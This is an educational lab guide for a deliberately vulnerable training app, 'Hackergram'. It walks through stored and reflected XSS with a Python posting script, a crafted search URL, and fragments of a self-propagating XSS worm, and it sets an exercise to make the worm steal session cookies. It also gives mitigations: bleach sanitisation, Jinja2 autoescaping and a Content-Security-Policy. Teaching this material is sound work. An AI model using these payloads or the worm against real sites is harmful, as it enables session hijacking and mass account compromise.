# Cross-Site Scripting (XSS)

## Objective

Cross-Site Scripting (XSS) is a type of injection attack in which malicious scripts are injected into
otherwise trusted web pages. When a victim visits an affected page, the injected script executes in their
browser, allowing the attacker to steal session cookies, redirect users, deface pages, or perform actions on
behalf of the victim. This experiment covers Hackergram's three XSS variants — **Stored**, **Reflected**, and
**Worm** — each demonstrating a different consequence of the same missing-output-encoding root cause.

## Affected Hackergram functionality

- `/create_post` (POST) — where Stored XSS and the XSS Worm payload are planted.
- Homepage and profile pages — where stored posts (and the worm) are rendered back to other users.
- `/users` — user search (`search` query parameter), the Reflected XSS target.
- `/settings` — the profile-photo field is also vulnerable to Stored XSS (see the exercise below).

## Prerequisites

Simple/local deployment. No attacker HTTP server is needed for any of the three variants — payloads are
delivered by creating a post, or via a crafted URL.

## Initial state

Run `/reset` first. The scripts below register and log in their own throwaway user (`mallory`).

## Vulnerable implementation

`views.py`'s `/create_post` handler stores the `content` field as-is in the `Posts` table, and the templates
that render posts (post cards on the homepage and profile pages) output that content without HTML escaping or
a sanitization pass such as `bleach.clean()`. Separately, the `/users` search-results template disables
Jinja2's automatic escaping for the search term it echoes back (e.g. via `{% autoescape false %}`), which is
what makes Reflected XSS possible on that endpoint.

## Experiment

### Stored XSS

In this attack, the attacker writes a post that contains JavaScript code (which gets stored in Hackergram's
database). When users see the post, the victim-browser executes the code.

1. Create a file with the following Python script at the attacker:

    ??? note "Stored XSS Attack Script"

        ``` py
        import requests
        import sys

        def reset(session):
            session.get(SERVER+"/reset")

        def register(session):
            payload = {
                'username': "mallory",
                'name': "Mallory",
                'password': "eve123"
            }
            session.post(SERVER+"/signup", data=payload)

        def login(session):
            payload = {
                'username': "mallory",
                'password': "eve123"
            }
            session.post(SERVER+"/login", data=payload)

        def exploit(session):
            payload = {
                'content': "<script>alert(\"XSS\")</script>",
            }
            r = session.post(SERVER+"/create_post", data=payload)
            print(r)

        if __name__ == '__main__':
            host = '192.168.0.100' if len(sys.argv) < 2 else sys.argv[1]
            port = '80' if len(sys.argv) < 3 else sys.argv[2]
            SERVER = "http://" + host + ":" + port
            print(SERVER)
            with requests.session() as s:
                reset(s)
                register(s)
                login(s)
                exploit(s)
        ```

    The script resets Hackergram, registers and logs in as `mallory`, then posts the content
    `<script>alert("XSS")</script>` via `/create_post`. This post is now stored in Hackergram's database.

2. Install a Wireshark probe at the Hackergram interface.
3. Run the script at the attacker.
4. Login to Hackergram (e.g., as `mr_robot`) and check that the victim-browser runs the JavaScript code when
   visiting either Mallory's profile page or Hackergram's homepage. A pop-up box with the message `XSS` must
   be displayed.
5. Analyze the traffic exchanged by Hackergram using an `http` filter. Identify the HTTP message that injects
   the JavaScript code in Hackergram and the one that transfers it to the victim-browser.

!!! note "Additional exercise"

    The `/settings` endpoint is also vulnerable to this attack type. Find a way of using the photo field to
    attack this endpoint.

### Reflected XSS

In this attack, the attacker tricks the victim into clicking a malicious link which results in JavaScript
code being executed in the victim-browser, hence the name reflected XSS.

The vulnerable endpoint is `/users`, which allows searching for users by providing a search string passed as
the `search` argument of a GET request.

1. Install a Wireshark probe at the Hackergram interface.
2. In the victim-browser enter:
   `http://192.168.0.100/users?search=<script>alert%28"XSS"%29<%2Fscript>`
   Note that `%28` and `%29` encode `(` and `)`, and `%2F` encodes `/`.
3. Check that a pop-up box with the message `XSS` is displayed.
4. Analyze the traffic exchanged by Hackergram using an `HTTP` filter. Identify the `HTTP` message that sends
   the JavaScript code to Hackergram, and the one where it is reflected to the victim-browser.

!!! note "Additional exercises"

    1. Hackergram has another endpoint vulnerable to this attack. Discover it and perform the attack.
    2. Using the bleach library, sanitize the `/users` endpoint so that the attack is no longer possible.

### XSS Worm

The presence of a stored XSS vulnerability enables a particularly dangerous form of malware: an XSS worm. A
worm exploits the feedback loop inherent in social applications — malicious script is stored as application
content, executed when another user loads the affected page, and then uses the application itself to create a
new infected artifact, enabling self-propagation through the platform.

In Hackergram, the worm exploits the posts feature. An attacker creates a post containing malicious
JavaScript. When another user visits the page, the browser executes the script under the application's
origin. The script then automatically creates a new post on behalf of the victim, propagating the attack
further.

**How the worm self-propagates.** The worm reconstructs a copy of its own code from the page's DOM:

```js
var code = document.getElementById("worm").innerHTML;
```

It then rebuilds a complete `<script>` element and encodes it so it can be transmitted inside an HTTP request:

```js
var header = "<script type=" + "text/javascript" + " id=" + "worm>";
var tail = "</" + "script>";
var worm = encodeURIComponent(header + code + tail);
```

After reconstructing the payload, the worm sends a POST request to the vulnerable `/create_post` endpoint,
embedding both a visible message and the encoded copy of the worm:

```js
var params = "&content=Mallory hacked me" + worm;
http.open("POST", url, true);
http.send(params);
```

When the victim's browser executes this request, a new post is created under their account containing both
the message and the malicious script. This post becomes a new infection source: when another user views it,
their browser executes the same payload, creating yet another infected post and propagating the worm
further.

Before propagating, the worm checks whether the current user is the attacker, by inspecting the DOM element
that contains the username:

```js
document.getElementById("user").outerHTML.search("mallory")
```

This expression returns the index position of `"mallory"` within the HTML of the user element, or `-1` if the
string is not found. The worm only proceeds when the result is `-1`, preventing the attacker from reinfecting
her own account.

1. Using the attacker machine, create a post that contains the XSS worm payload described above.
2. Log in as a different user (e.g., `mr_robot`) and visit the posts page — first victim.
3. Confirm that a new post was automatically created under `mr_robot`'s account containing a copy of the
   worm — a new infected post, created without further attacker action.
4. Log in as a third user (second victim) and verify that the worm has propagated again.

!!! note "Additional exercise"

    Modify the worm so that, in addition to creating a new post, it also sends the victim's session cookie to
    an attacker-controlled endpoint before propagating.

## Expected result

- Stored XSS: any user who loads a page listing Mallory's post sees a JavaScript alert reading `XSS` — the
  script executes in *their* browser, under *their* session.
- Reflected XSS: loading the crafted URL triggers the alert immediately, with nothing persisted — reloading
  without the `search` parameter no longer shows it.
- XSS Worm: after the initial injection, no further attacker action is needed — each user who views an
  infected post becomes a new carrier, visible as a new post under *their own* account containing the
  identical script.

## Why it works

**Stored XSS:** the post's `content` is stored and later interpolated into the page's HTML with no escaping
and no allowlist-based sanitization, so a `<script>` tag stored today executes for every visitor who loads
that post later.

**Reflected XSS:** the `search` value is placed into the response HTML unescaped, because autoescaping has
been disabled for that template section — the browser parses the injected `<script>` tag as markup rather
than displaying it as literal search text.

**XSS Worm:** this combines the Stored XSS primitive with a self-replication check — the script inspects the
DOM for the logged-in username, and if the current viewer isn't already an infected carrier, it issues its
own authenticated `POST /create_post` request (using the victim's own session) to plant a fresh copy of
itself. Because the payload it posts is exactly the script that's currently running, each new post is itself
infectious.

## Reset / cleanup

Run `/reset` to remove all malicious/infected posts (essential after the worm, since it can spread to every
account you log into during the experiment).

## Inspect and modify

Effective prevention of XSS attacks involves a multi-layer defense strategy combining input sanitization,
output encoding, and a [Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP).

**Stored XSS / Worm mitigation.** Apply `html-sanitizer` or `bleach`, a maintained allowlist-based HTML
sanitizer, to all user-supplied input prior to rendering or storage:

```python
new_name = request.form['name']
```

becomes:

```python
cleaned_new_name = bleach.clean(request.form['name'])
```

Apply the same treatment to `/create_post`'s `content` field — this closes both the Stored XSS and the worm
in one fix, since the worm depends entirely on the same unsanitized storage/render path.

**Reflected XSS mitigation.** Remove any `{% autoescape false %}` / `{% endautoescape %}` directives from the
templates that render search results, so Jinja2's automatic escaping applies.

**Content Security Policy.** Disallow inline scripts by adding this directive to `base.html`:

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'none'; object-src 'none';">
```

Apply these fixes and repeat all three experiments to confirm none of the payloads execute anymore.

## Exercise

1. The `/settings` endpoint is also vulnerable to Stored XSS. Find a way of using the photo field to attack
   it.
2. Hackergram has another endpoint vulnerable to Reflected XSS. Discover it and perform the attack, then
   sanitize `/users` with `bleach` so the original attack no longer works.
3. Using the attacker machine, create a post containing the XSS worm payload, confirm it propagates through
   at least two victims, then modify it so it also exfiltrates the victim's session cookie before
   propagating.

## Hint

<details>
<summary>💡 Hint</summary>

For the photo-field Stored XSS: if the photo field is rendered into an `<img>` tag's attributes without
escaping, closing the attribute early with a `"` or `'` followed by a new tag lets you inject arbitrary
markup. For the worm's cookie exfiltration: `document.cookie` is readable by injected JavaScript unless the
session cookie is marked `HttpOnly`.

</details>
